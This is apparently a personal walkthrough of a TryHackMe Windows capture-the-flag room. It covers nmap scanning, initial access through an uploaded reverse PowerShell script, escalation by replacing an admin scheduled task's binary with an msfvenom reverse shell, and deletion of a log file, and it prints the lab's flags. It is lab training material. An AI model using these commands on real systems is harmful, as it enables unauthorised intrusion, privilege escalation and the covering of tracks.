---
Status: "#Not-Started"
OS:
ip:
Start_Time: 2026-02-11 17:37
---

## 🔍 2. Information Gathering & Enumeration

### 2.1 Service Scanning
	As normal, I start with a nmap full scan and a detailed scan. The results show that the target is a windows machine and some other valueble information.
	I found that the hostname is listed, and certification of port 3389. There also other information about web server and the smb signing. Also port 5985 is opened, which is used for WinRM.
```bash
# Nmap Full Scan
nmap -p- --min-rate 1000 -oN nmap_full.txt <IP>
# Nmap detailed service scan
nmap -Pn -sV -sC -p <PORTS> <IP> -oN nmap_detailed
```
![[assets/Pasted image 20260211174037.png]]
![[assets/Pasted image 20260211174047.png]]
![[assets/Pasted image 20260211174053.png]]
	Following the nmap results, I found that target is running web service at 8080. So I viewed 8080 and find that this is a powershell script analyzer.
![[assets/Pasted image 20260211182122.png]]



---

##  3. Initial access
	emmm.... I didn't think this is a easy task. But the truth is it is a quite easy room with straight forward easy access. I just upload a reverse powershell script and I got the call back.

![[assets/Pasted image 20260211182407.png]]
	Okay, so let's find out where are we. I view the result of whoami /priv and /groups, I found that the current user is not in an admin group, and it doesn't have privlege. Also, there is no information left in local registry. So I view the content of the web service. I cd to the xampp and view the files.
![[assets/Pasted image 20260211185022.png]]
	I found that there are strange files called UACME-Akagi64.exe and DebugCrashTHM.exe.
![[assets/Pasted image 20260211185224.png]]
	And I have completely access to the DebugCrashTHM.exe file. 
```
icalcls C:\xampp\DebugCrashTHM.exe
```
	Also I found that this is also a scheduled task and it is ran by admin. And it is triggered at logon time. Also I have the privlege to directly trigger it.
```
schtasks /query /tn \MyTHMTask /fo LIST /v
```
![[assets/Pasted image 20260211185424.png]]
![[assets/Pasted image 20260211185513.png]]
	Now, the escalation path is clear.
##  4. Privilege Escalation
	First, I use msfvenom to generate a reverse shell.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=4444 -f exe -o shell.exe
```
![[assets/Pasted image 20260211185643.png]]
	I host a listener and remotely download the payload.
```
Invoke-WebRequest -Uri http://ip/shell.exe -OutFile shell.exe
```
![[assets/Pasted image 20260211185932.png]]
	Next, I forced to substitute the target exe.
```
move shell.exe C:\xampp\DebugCrashTHM.exe -Force
```
![[assets/Pasted image 20260211190044.png]]
	Now, I host a listener and trigger it. 
![[assets/Pasted image 20260211190117.png]]

![[assets/Pasted image 20260211190133.png]]
	We are admin now.
	However, when I tried to view the flag, it shows this.
![[assets/Pasted image 20260211190514.png]]
	It seems we need one more step.

## 6.Clear log
	I first try to find the log files.
	
![[assets/Pasted image 20260211190656.png]]
```
dir C:\xampp\htdocs /s /b | findstr log
```
	I found the log files, so let's just delete it.
	
![[assets/Pasted image 20260211190812.png]]
```
del C:\xampp\htdocs\uploads\log.txt
```
	Now we can access the flag files.


---

##  7. Proof of Possession (Flags)
> [!DANGER] CRITICAL FOR OSCP
> The screenshot MUST contain: `whoami`, `ipconfig / ifconfig`, and the `flag` content in ONE terminal window.

| Flag Type     | Flag Content (Hash)          | Screenshot (Link)                           |
| :------------ | :--------------------------- | :------------------------------------------ |
| **local.txt** | THM{1010_EVASION_LOCAL_USER} | ![[assets/Pasted image 20260211190907.png]] |
| **proof.txt** | THM{101011_ADMIN_ACCESS}     | ![[assets/Pasted image 20260211191008.png]] |

---

